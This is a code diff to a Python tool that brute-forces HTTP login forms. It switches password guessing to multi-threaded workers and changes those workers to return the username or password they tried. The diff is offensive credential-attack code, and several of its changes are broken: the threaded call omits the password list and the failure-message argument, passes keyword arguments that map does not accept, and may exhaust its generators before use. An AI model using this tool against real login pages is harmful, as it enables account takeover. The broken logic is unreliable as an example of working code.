@@ -94,7 +94,7 @@ def attack_http(target, wordlist, userfail, passfail, username = None, thread_co
             users = gen_passwords(wordlist)
 
             # Brute Force Username (Multi-Threaded)            
-            wordlist_len = len(users)
+            wordlist_len = len(list(users))
             with ThreadPoolExecutor(max_workers=thread_count) as executor:
                 workers = executor.map(
                     user_worker_http, users, [target] * wordlist_len, [userfail] * wordlist_len,
@@ -124,13 +124,27 @@ def attack_http(target, wordlist, userfail, passfail, username = None, thread_co
 
         passwds = gen_passwords(wordlist)
 
-        # Brute Force Password
-        for passwd in passwds:
-            success, message = pass_worker_http(found_user, passwd, target, passfail, userfield = userfield, passfield = passfield)
+        # Brute Force Password (Multi-Threaded)
+        passwds_len = len(list(passwds))
+        with ThreadPoolExecutor(max_workers=thread_count) as executor:
+            workers = executor.map(
+                pass_worker_http, [found_user] * passwds_len, [target] * passwds_len,
+                userfield = [userfield] * passwds_len, passfield = [passfield] * passwds_len
+            )
 
-            if success:
-                found_pass = passwd
-                break
+            try:
+                for cur_pass, success, message in workers:
+                    if success:
+                        found_pass = cur_pass
+                        executor.shutdown(wait=False)
+                        break
+            except KeyboardInterrupt:
+                message = "User Terminated Via KeyboardInterrupt"
+                raise KeyboardInterrupt(message)
+            except Exception as ex:
+                executor.shutdown(wait=False)
+                message = str(ex)
+                raise ex
 
         if found_pass is None:
             raise ValueError("No Password Found")
@@ -236,6 +250,7 @@ def pass_worker_http(username, password, target, passfail, userfield = None, pas
         userfield - name of field used to transmit username. default = username.
         passfield - name of field used to transmit password. default = password.
     Return(s):
+        password - password tested.
         message - status message.
         success - boolean indication of success.
         (success, message) - return format
@@ -270,7 +285,7 @@ def pass_worker_http(username, password, target, passfail, userfield = None, pas
         success = False
         message = f"Status: {e}"
 
-    return (success, message)
+    return (password, success, message)
 
 
 def user_worker_http(username, target, userfail, userfield = None, passfield = None):
@@ -288,6 +303,7 @@ def user_worker_http(username, target, userfail, userfield = None, passfield = N
         userfield - name of field used to pass in username. default = username.
         passfield - name of field used to pass in password. default = password.
     Return(s):
+        username - username tested.
         message - status message.
         success - boolean indication of success.
         (success, message) - return format
@@ -330,7 +346,7 @@ def user_worker_http(username, target, userfail, userfield = None, passfield = N
         success = False
         message = f"Status: {e}"
 
-    return (success, message)
+    return (username, success, message)
 
 
 def wordlist_exists(wordlist):
@@ -486,7 +502,7 @@ def main():
             # Begin Attack
             creds, success, message = attack_http(
                         target, filename, username_fail_message, password_fail_message, 
-                        username = username, userfield = username_field_name, passfield = password_field_name,
+                        username = target_username, userfield = username_field_name, passfield = password_field_name,
                         thread_count = thread_count
                     )
 
